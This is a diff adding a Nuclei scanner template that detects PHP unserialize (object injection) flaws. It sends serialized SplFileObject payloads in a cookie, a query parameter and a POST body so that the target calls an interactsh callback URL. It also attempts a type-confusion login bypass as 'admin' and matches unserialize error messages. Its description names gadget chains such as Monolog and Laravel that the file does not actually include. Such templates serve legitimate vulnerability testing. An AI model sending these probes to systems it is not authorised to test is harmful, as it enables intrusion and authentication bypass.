@@ -1,0 +1,126 @@
+id: php-object-injection-blind-detection
+
+info:
+  name: PHP Object Injection - Blind Detection via Interactsh
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects blind PHP object injection (unserialize) vulnerabilities using OOB
+    callbacks via interactsh. Sends serialized PHP objects targeting common gadget
+    chains (Monolog, Guzzle, Laravel, Symfony) that trigger DNS/HTTP callbacks
+    without executing destructive commands. Also detects unserialize() error
+    messages and type confusion patterns.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
+    - https://github.com/ambionics/phpggc
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-502
+  metadata:
+    max-request: 6
+  tags: php,deserialization,object-injection,interactsh,phpggc,detection-only
+
+http:
+  # Test 1: Serialized object in cookie — triggers URL fetch via SplFileObject
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=O:13:"SplFileObject":2:{s:11:"{{"\x00"}}*{{"\x00"}}fileName";s:38:"http://{{interactsh-url}}/cookie-deser";s:13:"{{"\x00"}}*{{"\x00"}}openMode";s:1:"r";}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: cookie-object-injection-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 2: Base64-encoded serialized object in parameter
+  - raw:
+      - |
+        GET /?data=TzoxMzoiU3BsRmlsZU9iamVjdCI6Mjp7czoxMToiACoAZmlsZU5hbWUiO3M6Mzg6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0vcGFyYW0tZGVzZXIiO3M6MTM6IgAqAG9wZW5Nb2RlIjtzOjE6InIiO30= HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: param-object-injection-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 3: POST body with serialized PHP object
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: text/html
+
+        token=O:13:"SplFileObject":2:{s:11:"%00*%00fileName";s:38:"http://{{interactsh-url}}/post-deser";s:13:"%00*%00openMode";s:1:"r";}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: post-object-injection-oob
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+  # Test 4: Detect unserialize error messages (in-band)
+  - raw:
+      - |
+        GET /?data=O:9999:"FakeClass":0:{} HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: unserialize-error-detected
+        regex:
+          - '(?i)unserialize\(\)\s*:'
+          - '(?i)__wakeup\(\)'
+          - '(?i)__destruct\(\)'
+          - '(?i)allowed_classes'
+          - '(?i)could not be converted to string'
+          - '(?i)Erroneous data format for unserializing'
+        part: body
+        condition: or
+
+  # Test 5: Type confusion with boolean/object serialization
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: application/json
+
+        username=admin&password=b:1;
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: dsl
+        name: type-confusion-auth-bypass
+        dsl:
+          - '!contains(body, "invalid") && !contains(body, "incorrect") && !contains(body, "failed") && (contains(body, "token") || contains(body, "session") || contains(body, "success") || contains(header, "Set-Cookie"))'
+
+    extractors:
+      - type: regex
+        name: deserialization-errors
+        group: 0
+        regex:
+          - '(?i)(unserialize[^<\n]{0,200})'
+          - '(?i)(__(?:wakeup|destruct|toString)[^<\n]{0,150})'
